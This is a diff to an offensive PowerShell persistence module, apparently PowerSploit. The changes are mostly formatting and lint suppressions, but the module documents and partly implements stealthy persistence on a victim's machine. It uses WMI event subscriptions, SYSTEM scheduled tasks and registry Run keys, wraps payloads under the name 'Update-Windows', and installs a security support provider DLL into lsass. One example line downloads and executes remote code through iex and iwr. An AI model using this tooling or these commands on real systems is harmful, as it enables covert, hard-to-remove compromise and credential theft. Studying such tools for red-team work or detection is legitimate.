@@ -3,84 +3,86 @@ function New-ElevatedPersistenceOption
 <#
 .SYNOPSIS
 
-    Configure elevated persistence options for the Add-Persistence function.
+Configure elevated persistence options for the Add-Persistence function.
 
-    PowerSploit Function: New-ElevatedPersistenceOption
-    Author: Matthew Graeber (@mattifestation)
-    License: BSD 3-Clause
-    Required Dependencies: None
-    Optional Dependencies: None
- 
+PowerSploit Function: New-ElevatedPersistenceOption  
+Author: Matthew Graeber (@mattifestation)  
+License: BSD 3-Clause  
+Required Dependencies: None  
+Optional Dependencies: None  
+
 .DESCRIPTION
 
-    New-ElevatedPersistenceOption allows for the configuration of elevated persistence options. The output of this function is a required parameter of Add-Persistence. Available persitence options in order of stealth are the following: permanent WMI subscription, scheduled task, and registry.
+New-ElevatedPersistenceOption allows for the configuration of elevated persistence options. The output of this function is a required parameter of Add-Persistence. Available persitence options in order of stealth are the following: permanent WMI subscription, scheduled task, and registry.
 
 .PARAMETER PermanentWMI
 
-    Persist via a permanent WMI event subscription. This option will be the most difficult to detect and remove.
+Persist via a permanent WMI event subscription. This option will be the most difficult to detect and remove.
 
-    Detection Difficulty:        Difficult
-    Removal Difficulty:          Difficult
-    User Detectable?             No
+Detection Difficulty:        Difficult
+Removal Difficulty:          Difficult
+User Detectable?             No
 
 .PARAMETER ScheduledTask
 
-    Persist via a scheduled task.
+Persist via a scheduled task.
 
-    Detection Difficulty:        Moderate
-    Removal Difficulty:          Moderate
-    User Detectable?             No
+Detection Difficulty:        Moderate
+Removal Difficulty:          Moderate
+User Detectable?             No
 
 .PARAMETER Registry
 
-    Persist via the HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry key. Note: This option will briefly pop up a PowerShell console to the user.
+Persist via the HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry key. Note: This option will briefly pop up a PowerShell console to the user.
 
-    Detection Difficulty:        Easy
-    Removal Difficulty:          Easy
-    User Detectable?             Yes
+Detection Difficulty:        Easy
+Removal Difficulty:          Easy
+User Detectable?             Yes
 
 .PARAMETER AtLogon
 
-    Starts the payload upon any user logon.
+Starts the payload upon any user logon.
 
 .PARAMETER AtStartup
 
-    Starts the payload within 240 and 325 seconds of computer startup.
+Starts the payload within 240 and 325 seconds of computer startup.
 
 .PARAMETER OnIdle
 
-    Starts the payload after one minute of idling.
+Starts the payload after one minute of idling.
 
 .PARAMETER Daily
 
-    Starts the payload daily.
+Starts the payload daily.
 
 .PARAMETER Hourly
 
-    Starts the payload hourly.
+Starts the payload hourly.
 
 .PARAMETER At
 
-    Starts the payload at the specified time. You may specify times in the following formats: '12:31 AM', '2 AM', '23:00:00', or '4:06:26 PM'.
+Starts the payload at the specified time. You may specify times in the following formats: '12:31 AM', '2 AM', '23:00:00', or '4:06:26 PM'.
 
 .EXAMPLE
 
-    C:\PS> $ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM'
+$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM'
 
 .EXAMPLE
 
-    C:\PS> $ElevatedOptions = New-ElevatedPersistenceOption -Registry -AtStartup
+$ElevatedOptions = New-ElevatedPersistenceOption -Registry -AtStartup
 
 .EXAMPLE
 
-    C:\PS> $ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle
+$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle
 
 .LINK
 
-    http://www.exploit-monday.com
+http://www.exploit-monday.com
 #>
 
-    [CmdletBinding()] Param (
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
+    [CmdletBinding()]
+    Param (
         [Parameter( ParameterSetName = 'PermanentWMIDaily', Mandatory = $True )]
         [Parameter( ParameterSetName = 'PermanentWMIAtStartup', Mandatory = $True )]
         [Switch]
@@ -189,68 +191,70 @@ function New-UserPersistenceOption
 <#
 .SYNOPSIS
 
-    Configure user-level persistence options for the Add-Persistence function.
+Configure user-level persistence options for the Add-Persistence function.
 
-    PowerSploit Function: New-UserPersistenceOption
-    Author: Matthew Graeber (@mattifestation)
-    License: BSD 3-Clause
-    Required Dependencies: None
-    Optional Dependencies: None
- 
+PowerSploit Function: New-UserPersistenceOption  
+Author: Matthew Graeber (@mattifestation)  
+License: BSD 3-Clause  
+Required Dependencies: None  
+Optional Dependencies: None  
+
 .DESCRIPTION
 
-    New-UserPersistenceOption allows for the configuration of elevated persistence options. The output of this function is a required parameter of Add-Persistence. Available persitence options in order of stealth are the following: scheduled task, registry.
+New-UserPersistenceOption allows for the configuration of elevated persistence options. The output of this function is a required parameter of Add-Persistence. Available persitence options in order of stealth are the following: scheduled task, registry.
 
 .PARAMETER ScheduledTask
 
-    Persist via a scheduled task.
+Persist via a scheduled task.
 
-    Detection Difficulty:        Moderate
-    Removal Difficulty:          Moderate
-    User Detectable?             No
+Detection Difficulty:        Moderate
+Removal Difficulty:          Moderate
+User Detectable?             No
 
 .PARAMETER Registry
 
-    Persist via the HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry key. Note: This option will briefly pop up a PowerShell console to the user.
+Persist via the HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry key. Note: This option will briefly pop up a PowerShell console to the user.
 
-    Detection Difficulty:        Easy
-    Removal Difficulty:          Easy
-    User Detectable?             Yes
+Detection Difficulty:        Easy
+Removal Difficulty:          Easy
+User Detectable?             Yes
 
 .PARAMETER AtLogon
 
-    Starts the payload upon any user logon.
+Starts the payload upon any user logon.
 
 .PARAMETER OnIdle
 
-    Starts the payload after one minute of idling.
+Starts the payload after one minute of idling.
 
 .PARAMETER Daily
 
-    Starts the payload daily.
+Starts the payload daily.
 
 .PARAMETER Hourly
 
-    Starts the payload hourly.
+Starts the payload hourly.
 
 .PARAMETER At
 
-    Starts the payload at the specified time. You may specify times in the following formats: '12:31 AM', '2 AM', '23:00:00', or '4:06:26 PM'.
+Starts the payload at the specified time. You may specify times in the following formats: '12:31 AM', '2 AM', '23:00:00', or '4:06:26 PM'.
 
 .EXAMPLE
 
-    C:\PS> $UserOptions = New-UserPersistenceOption -Registry -AtLogon
+$UserOptions = New-UserPersistenceOption -Registry -AtLogon
 
 .EXAMPLE
 
-    C:\PS> $UserOptions = New-UserPersistenceOption -ScheduledTask -OnIdle
+$UserOptions = New-UserPersistenceOption -ScheduledTask -OnIdle
 
 .LINK
 
-    http://www.exploit-monday.com
+http://www.exploit-monday.com
 #>
 
-    [CmdletBinding()] Param (
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
+    [CmdletBinding()]
+    Param (
         [Parameter( ParameterSetName = 'ScheduledTaskDaily', Mandatory = $True )]
         [Parameter( ParameterSetName = 'ScheduledTaskHourly', Mandatory = $True )]
         [Parameter( ParameterSetName = 'ScheduledTaskOnIdle', Mandatory = $True )]
@@ -333,99 +337,104 @@ function Add-Persistence
 <#
 .SYNOPSIS
 
-    Add persistence capabilities to a script.
+Add persistence capabilities to a script.
 
-    PowerSploit Function: Add-Persistence
-    Author: Matthew Graeber (@mattifestation)
-    License: BSD 3-Clause
-    Required Dependencies: New-ElevatedPersistenceOption, New-UserPersistenceOption
-    Optional Dependencies: None
- 
+PowerSploit Function: Add-Persistence  
+Author: Matthew Graeber (@mattifestation)  
+License: BSD 3-Clause  
+Required Dependencies: New-ElevatedPersistenceOption, New-UserPersistenceOption  
+Optional Dependencies: None  
+
 .DESCRIPTION
 
-    Add-Persistence will add persistence capabilities to any script or scriptblock. This function will output both the newly created script with persistence capabilities as well a script that will remove a script after it has been persisted.
+Add-Persistence will add persistence capabilities to any script or scriptblock. This function will output both the newly created script with persistence capabilities as well a script that will remove a script after it has been persisted.
 
 .PARAMETER ScriptBlock
 
-    Specifies a scriptblock containing your payload.
+Specifies a scriptblock containing your payload.
 
 .PARAMETER FilePath
 
-    Specifies the path to your payload.
+Specifies the path to your payload.
 
 .PARAMETER ElevatedPersistenceOption
 
-    Specifies the trigger for the persistent payload if the target is running elevated.
-    You must run New-ElevatedPersistenceOption to generate this argument.
+Specifies the trigger for the persistent payload if the target is running elevated.
+You must run New-ElevatedPersistenceOption to generate this argument.
 
 .PARAMETER UserPersistenceOption
 
-    Specifies the trigger for the persistent payload if the target is not running elevated.
-    You must run New-UserPersistenceOption to generate this argument.
+Specifies the trigger for the persistent payload if the target is not running elevated.
+You must run New-UserPersistenceOption to generate this argument.
 
 .PARAMETER PersistenceScriptName
 
-    Specifies the name of the function that will wrap the original payload. The default value is 'Update-Windows'.
+Specifies the name of the function that will wrap the original payload. The default value is 'Update-Windows'.
 
 .PARAMETER DoNotPersistImmediately
 
-    Output only the wrapper function for the original payload. By default, Add-Persistence will output a script that will automatically attempt to persist (e.g. it will end with 'Update-Windows -Persist'). If you are in a position where you are running in memory but want to persist at a later time, use this option.
+Output only the wrapper function for the original payload. By default, Add-Persistence will output a script that will automatically attempt to persist (e.g. it will end with 'Update-Windows -Persist'). If you are in a position where you are running in memory but want to persist at a later time, use this option.
 
 .PARAMETER PersistentScriptFilePath
 
-    Specifies the path where you would like to output the persistence script. By default, Add-Persistence will write the removal script to 'Persistence.ps1' in the current directory.
+Specifies the path where you would like to output the persistence script. By default, Add-Persistence will write the removal script to 'Persistence.ps1' in the current directory.
 
 .PARAMETER RemovalScriptFilePath
 
-    Specifies the path where you would like to output a script that will remove the persistent payload. By default, Add-Persistence will write the removal script to 'RemovePersistence.ps1' in the current directory.
+Specifies the path where you would like to output a script that will remove the persistent payload. By default, Add-Persistence will write the removal script to 'RemovePersistence.ps1' in the current directory.
 
 .PARAMETER PassThru
 
-    Outputs the contents of the persistent script to the pipeline. This option is useful when you want to write the original persistent script to disk and pass the script to Out-EncodedCommand via the pipeline.
+Outputs the contents of the persistent script to the pipeline. This option is useful when you want to write the original persistent script to disk and pass the script to Out-EncodedCommand via the pipeline.
 
 .INPUTS
 
-    None
+None
 
-    Add-Persistence cannot receive any input from the pipeline.
+Add-Persistence cannot receive any input from the pipeline.
 
 .OUTPUTS
 
-    System.Management.Automation.ScriptBlock
+System.Management.Automation.ScriptBlock
 
-    If the '-PassThru' switch is provided, Add-Persistence will output a scriptblock containing the contents of the persistence script.
+If the '-PassThru' switch is provided, Add-Persistence will output a scriptblock containing the contents of the persistence script.
 
 .NOTES
 
-    When the persistent script executes, it will not generate any meaningful output as it was designed to run as silently as possible on the victim's machine.
+When the persistent script executes, it will not generate any meaningful output as it was designed to run as silently as possible on the victim's machine.
 
 .EXAMPLE
 
-    C:\PS>$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM'
-    C:\PS>$UserOptions = New-UserPersistenceOption -Registry -AtLogon
-    C:\PS>Add-Persistence -FilePath .\EvilPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose
+$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM'
+$UserOptions = New-UserPersistenceOption -Registry -AtLogon
+Add-Persistence -FilePath .\EvilPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose
 
-    Description
-    -----------
-    Creates a script containing the contents of EvilPayload.ps1 that when executed with the '-Persist' switch will persist the payload using its respective persistence mechanism (user-mode vs. elevated) determined at runtime.
+Description
+-----------
+Creates a script containing the contents of EvilPayload.ps1 that when executed with the '-Persist' switch will persist the payload using its respective persistence mechanism (user-mode vs. elevated) determined at runtime.
 
 .EXAMPLE
 
-    C:\PS>$Rickroll = { iex (iwr http://bit.ly/e0Mw9w ) }
-    C:\PS>$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle
-    C:\PS>$UserOptions = New-UserPersistenceOption -ScheduledTask -OnIdle
-    C:\PS>Add-Persistence -ScriptBlock $RickRoll -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose -PassThru | Out-EncodedCommand | Out-File .\EncodedPersistentScript.ps1
+$Rickroll = { iex (iwr http://bit.ly/e0Mw9w ) }
+$ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle
+$UserOptions = New-UserPersistenceOption -ScheduledTask -OnIdle
+Add-Persistence -ScriptBlock $RickRoll -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose -PassThru | Out-EncodedCommand | Out-File .\EncodedPersistentScript.ps1
 
-    Description
-    -----------
-    Creates a script containing the contents of the provided scriptblock that when executed with the '-Persist' switch will persist the payload using its respective persistence mechanism (user-mode vs. elevated) determined at runtime. The output is then passed through to Out-EncodedCommand so that it can be executed in a single command line statement. The final, encoded output is finally saved to .\EncodedPersistentScript.ps1
+Description
+-----------
+Creates a script containing the contents of the provided scriptblock that when executed with the '-Persist' switch will persist the payload using its respective persistence mechanism (user-mode vs. elevated) determined at runtime. The output is then passed through to Out-EncodedCommand so that it can be executed in a single command line statement. The final, encoded output is finally saved to .\EncodedPersistentScript.ps1
 
 .LINK
 
-    http://www.exploit-monday.com
+http://www.exploit-monday.com
 #>
-
-    [CmdletBinding()] Param (
+    
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingInvokeExpression', '')]
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingWMICmdlet', '')]
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingCmdletAliases', '')]
+    [CmdletBinding()]
+    Param (
         [Parameter( Mandatory = $True, ValueFromPipeline = $True, ParameterSetName = 'ScriptBlock' )]
         [ValidateNotNullOrEmpty()]
         [ScriptBlock]
@@ -527,7 +536,6 @@ function Add-Persistence
 
 #region Initialize data
 
-    $CompressedScript = ''
     $UserTrigger = ''
     $UserTriggerRemoval = ''
     $ElevatedTrigger = "''"
@@ -598,7 +606,7 @@ Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Obj
                 {
                     $ElevatedTrigger = "schtasks /Create /RU system /SC ONLOGON /TN Updater /TR "
                 }
-                
+
                 'Daily'
                 {
                     $ElevatedTrigger = "schtasks /Create /RU system /SC DAILY /ST $($ElevatedPersistenceOption.Time.ToString('HH:mm:ss')) /TN Updater /TR "
@@ -732,11 +740,13 @@ else
 $PersistenceRemoval = @"
 # Execute the following to remove the elevated persistent payload
 $ElevatedTriggerRemoval
+(gc `$PROFILE.AllUsersAllHosts) -replace '[\s]{600}.+',''| Out-File `$PROFILE.AllUsersAllHosts -Fo
 # Execute the following to remove the user-level persistent payload
 $UserTriggerRemoval
+(gc `$PROFILE.CurrentUserAllHosts) -replace '[\s]{600}.+',''| Out-File `$PROFILE.CurrentUserAllHosts -Fo
 "@
 
-    
+
     $PersistantScript | Out-File $PersistentScriptFile
     Write-Verbose "Persistence script written to $PersistentScriptFile"
 
@@ -759,10 +769,10 @@ function Install-SSP
 
 Installs a security support provider (SSP) dll.
 
-Author: Matthew Graeber (@mattifestation)
-License: BSD 3-Clause
-Required Dependencies: None
-Optional Dependencies: None
+Author: Matthew Graeber (@mattifestation)  
+License: BSD 3-Clause  
+Required Dependencies: None  
+Optional Dependencies: None  
 
 .DESCRIPTION
 
@@ -785,7 +795,12 @@ if you are running a 64-bit OS. In order for the SSP dll to be loaded properly
 into lsass, the dll must export SpLsaModeInitialize.
 #>
 
-    [CmdletBinding()] Param (
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingWMICmdlet', '')]
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingCmdletAliases', '')]
+    [CmdletBinding()]
+    Param (
         [ValidateScript({Test-Path (Resolve-Path $_)})]
         [String]
         $Path
@@ -811,43 +826,43 @@ into lsass, the dll must export SpLsaModeInitialize.
             [String]
             $Path
         )
-    
+
         # Parse PE header to see if binary was compiled 32 or 64-bit
         $FileStream = New-Object System.IO.FileStream($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
-    
+
         [Byte[]] $MZHeader = New-Object Byte[](2)
         $FileStream.Read($MZHeader,0,2) | Out-Null
-    
+
         $Header = [System.Text.AsciiEncoding]::ASCII.GetString($MZHeader)
         if ($Header -ne 'MZ')
         {
             $FileStream.Close()
             Throw 'Invalid PE header.'
         }
-    
+
         # Seek to 0x3c - IMAGE_DOS_HEADER.e_lfanew (i.e. Offset to PE Header)
         $FileStream.Seek(0x3c, [System.IO.SeekOrigin]::Begin) | Out-Null
-    
+
         [Byte[]] $lfanew = New-Object Byte[](4)
-    
+
         # Read offset to the PE Header (will be read in reverse)
         $FileStream.Read($lfanew,0,4) | Out-Null
-        $PEOffset = [Int] ('0x{0}' -f (( $lfanew[-1..-4] | % { $_.ToString('X2') } ) -join ''))
-    
+        $PEOffset = [Int] ('0x{0}' -f (( $lfanew[-1..-4] | ForEach-Object { $_.ToString('X2') } ) -join ''))
+
         # Seek to IMAGE_FILE_HEADER.IMAGE_FILE_MACHINE
         $FileStream.Seek($PEOffset + 4, [System.IO.SeekOrigin]::Begin) | Out-Null
         [Byte[]] $IMAGE_FILE_MACHINE = New-Object Byte[](2)
-    
+
         # Read compiled architecture
         $FileStream.Read($IMAGE_FILE_MACHINE,0,2) | Out-Null
-        $Architecture = '{0}' -f (( $IMAGE_FILE_MACHINE[-1..-2] | % { $_.ToString('X2') } ) -join '')
+        $Architecture = '{0}' -f (( $IMAGE_FILE_MACHINE[-1..-2] | ForEach-Object { $_.ToString('X2') } ) -join '')
         $FileStream.Close()
-    
+
         if (($Architecture -ne '014C') -and ($Architecture -ne '8664'))
         {
             Throw 'Invalid PE header or unsupported architecture.'
         }
-    
+
         if ($Architecture -eq '014C')
         {
             Write-Output '32-bit'
@@ -875,7 +890,7 @@ into lsass, the dll must export SpLsaModeInitialize.
 
     # Get the dll filename without the extension.
     # This will be added to the registry.
-    $DllName = $Dll | % { % {($_ -split '\.')[0]} }
+    $DllName = $Dll | ForEach-Object { % {($_ -split '\.')[0]} }
 
     # Enumerate all of the currently installed SSPs
     $SecurityPackages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' |
@@ -928,7 +943,8 @@ into lsass, the dll must export SpLsaModeInitialize.
 
     if ([IntPtr]::Size -eq 4) {
         $StructSize = 20
-    } else {
+    }
+    else {
         $StructSize = 24
     }
 
@@ -939,7 +955,8 @@ into lsass, the dll must export SpLsaModeInitialize.
 
     try {
         $Result = $Secur32::AddSecurityPackage($DllName, $StructPtr)
-    } catch {
+    }
+    catch {
         $HResult = $Error[0].Exception.InnerException.HResult
         Write-Warning "Runtime loading of the SSP failed. (0x$($HResult.ToString('X8')))"
         Write-Warning "Reason: $(([ComponentModel.Win32Exception] $HResult).Message)"
@@ -948,34 +965,37 @@ into lsass, the dll must export SpLsaModeInitialize.
 
     if ($RuntimeSuccess) {
         Write-Verbose 'Installation and loading complete!'
-    } else {
+    }
+    else {
         Write-Verbose 'Installation complete! Reboot for changes to take effect.'
     }
 }
 
-function Get-SecurityPackages
+function Get-SecurityPackage
 {
 <#
 .SYNOPSIS
 
 Enumerates all loaded security packages (SSPs).
 
-Author: Matthew Graeber (@mattifestation)
-License: BSD 3-Clause
-Required Dependencies: None
-Optional Dependencies: None
+Author: Matthew Graeber (@mattifestation)  
+License: BSD 3-Clause  
+Required Dependencies: None  
+Optional Dependencies: None  
 
 .DESCRIPTION
 
-Get-SecurityPackages is a wrapper for secur32!EnumerateSecurityPackages.
+Get-SecurityPackage is a wrapper for secur32!EnumerateSecurityPackages.
 It also parses the returned SecPkgInfo struct array.
 
 .EXAMPLE
 
-Get-SecurityPackages
+Get-SecurityPackage
 #>
 
-    [CmdletBinding()] Param()
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
+    [CmdletBinding()]
+    Param()
 
     #region P/Invoke declarations for secur32.dll
     $DynAssembly = New-Object System.Reflection.AssemblyName('SSPI')
